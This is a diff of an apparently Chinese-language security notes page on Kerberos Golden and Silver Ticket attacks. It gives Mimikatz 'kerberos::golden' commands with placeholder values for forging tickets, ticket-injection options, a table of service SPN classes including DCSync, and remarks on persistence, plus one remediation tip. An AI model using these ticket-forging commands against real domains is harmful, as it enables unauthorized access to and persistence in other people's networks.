@@ -25,51 +25,37 @@
 	</div>
 <xmp id="md" style="display: none;">
 <!-- markdown -->
-## Kerberos
-
-kerberos 协议认证流程
-
-```
-1. Client 请求 AS 得到 TGT
-2. Client 携带 TGT 请求 TGS 得到 TGS Ticket/ST
-3. Client 携带 ST 请求 Server
-```
-
 ## Golden Ticket
 
-通过伪造高权限的 TGT, 以达到访问域中所有服务的目的
+黄金票据利用 krbtgt 账户的 NTLM-Hash/AES-Key 伪造 TGT, 借此以访问域内所有资源.
 
 ```
-kerberos::golden /user:FAKEUSERNAME /domain:DOMAINNAME /sid:DOMAINSID /krbtgt:KRBTGTNTLMHASH
+kerberos::golden /user:fake-user /domain:domain-name /sid:domain-sid /krbtgt:krbtgt-hash
 ```
 
-添加 `/ptt` 参数可在直接当前会话中使用 ticket
+通过 `/aes256`, `/aes128` 可指定 AES-Key 替代 NTLM-Hash.
 
-导入 ticket
+另有 `/ptt` 参数以直接在当前会话注入票据.
 
-```
-kerberos::ptt ticket.kirbi
-```
+默认有效时间为 20 分钟, 过期可重新导入.
 
-默认有效时间为 20 分钟, 过期可重新导入
-
-通过快速更改 krbtgt 密码两次可使 golden ticket 失效
+快速更改 krbtgt 账户密码两次可使票据失效.
 
 ## Silver Ticket
 
-通过伪造 ST 访问指定服务, 仅能使用一次
+白银票据利用服务账户的 NTLM-Hash/AES-Key 伪造 TGS Ticket, 可访问指定服务.
+
+其实跟 Kerberoast 爆破后的利用类似, 个人认为银票作为维持权限的方法并不合适, 如果是第三方服务建议进一步利用, CIFS LDAP 这类倒不如直接针对系统本身进行权限维持.
 
 ```
-kerberos::golden /user:FAKEUSERNAME /domain:DOMAINNAME /sid:DOMAINSID /target:TARGETFQDN /service:SERVICENAME /rc4:SERVICENTLMHASH
+kerberos::golden /user:fake-user /domain:domain-name /sid:domain-sid /target:target-host /service:service-name /rc4:service-hash
 ```
 
-添加 `/ptt` 参数可在直接当前会话中使用 ticket
+注意目标服务只有添加了对应的 SPN 信息才能够使用银票.
 
-其中服务 Hash 还可通过 kerberoast 爆破获取
+系统服务.
 
-service
-
-````
+```
 WMI: HOST RPCSS
 WinRM: HOST HTTP
 Scheduled Tasks: HOST
@@ -78,56 +64,41 @@ PowerShell Remoting: HOST HTTP
 LDAP operations including Mimikatz DCSync: LDAP
 Windows Remote Server Administration Tools: RPCSS LDAP CIFS
 ```
-导入 ticket
 
-```
-kerberos::ptt ticket.kirbi
-```
+常用第三方服务 [ADSecurity](https://adsecurity.org/?page_id=183).
 <!-- markdown end -->
 </xmp>
 <div class="entry" id="main">
 <!-- content -->
-<h2 id="kerberos">Kerberos</h2>
-
-<p>kerberos 协议认证流程</p>
-
-<pre><code>1. Client 请求 AS 得到 TGT
-2. Client 携带 TGT 请求 TGS 得到 TGS Ticket/ST
-3. Client 携带 ST 请求 Server
-</code></pre>
-
 <h2 id="goldenticket">Golden Ticket</h2>
 
-<p>通过伪造高权限的 TGT, 以达到访问域中所有服务的目的</p>
+<p>黄金票据利用 krbtgt 账户的 NTLM-Hash/AES-Key 伪造 TGT, 借此以访问域内所有资源.</p>
 
-<pre><code>kerberos::golden /user:FAKEUSERNAME /domain:DOMAINNAME /sid:DOMAINSID /krbtgt:KRBTGTNTLMHASH
+<pre><code>kerberos::golden /user:fake-user /domain:domain-name /sid:domain-sid /krbtgt:krbtgt-hash
 </code></pre>
 
-<p>添加 <code>/ptt</code> 参数可在直接当前会话中使用 ticket</p>
+<p>通过 <code>/aes256</code>, <code>/aes128</code> 可指定 AES-Key 替代 NTLM-Hash.</p>
 
-<p>导入 ticket</p>
+<p>另有 <code>/ptt</code> 参数以直接在当前会话注入票据.</p>
 
-<pre><code>kerberos::ptt ticket.kirbi
-</code></pre>
+<p>默认有效时间为 20 分钟, 过期可重新导入.</p>
 
-<p>默认有效时间为 20 分钟, 过期可重新导入</p>
-
-<p>通过快速更改 krbtgt 密码两次可使 golden ticket 失效</p>
+<p>快速更改 krbtgt 账户密码两次可使票据失效.</p>
 
 <h2 id="silverticket">Silver Ticket</h2>
 
-<p>通过伪造 ST 访问指定服务, 仅能使用一次</p>
+<p>白银票据利用服务账户的 NTLM-Hash/AES-Key 伪造 TGS Ticket, 可访问指定服务.</p>
 
-<pre><code>kerberos::golden /user:FAKEUSERNAME /domain:DOMAINNAME /sid:DOMAINSID /target:TARGETFQDN /service:SERVICENAME /rc4:SERVICENTLMHASH
+<p>其实跟 Kerberoast 爆破后的利用类似, 个人认为银票作为维持权限的方法并不合适, 如果是第三方服务建议进一步利用, CIFS LDAP 这类倒不如直接针对系统本身进行权限维持.</p>
+
+<pre><code>kerberos::golden /user:fake-user /domain:domain-name /sid:domain-sid /target:target-host /service:service-name /rc4:service-hash
 </code></pre>
 
-<p>添加 <code>/ptt</code> 参数可在直接当前会话中使用 ticket</p>
+<p>注意目标服务只有添加了对应的 SPN 信息才能够使用银票.</p>
 
-<p>其中服务 Hash 还可通过 kerberoast 爆破获取</p>
+<p>系统服务.</p>
 
-<p>service</p>
-
-<pre><code class="`">WMI: HOST RPCSS
+<pre><code>WMI: HOST RPCSS
 WinRM: HOST HTTP
 Scheduled Tasks: HOST
 Windows File Share: CIFS
@@ -136,10 +107,7 @@ LDAP operations including Mimikatz DCSync: LDAP
 Windows Remote Server Administration Tools: RPCSS LDAP CIFS
 </code></pre>
 
-<p>导入 ticket</p>
-
-<pre><code>kerberos::ptt ticket.kirbi
-</code></pre>
+<p>常用第三方服务 <a href="https://adsecurity.org/?page_id=183">ADSecurity</a>.</p>
 <!-- content end -->
 </div>
 <br>
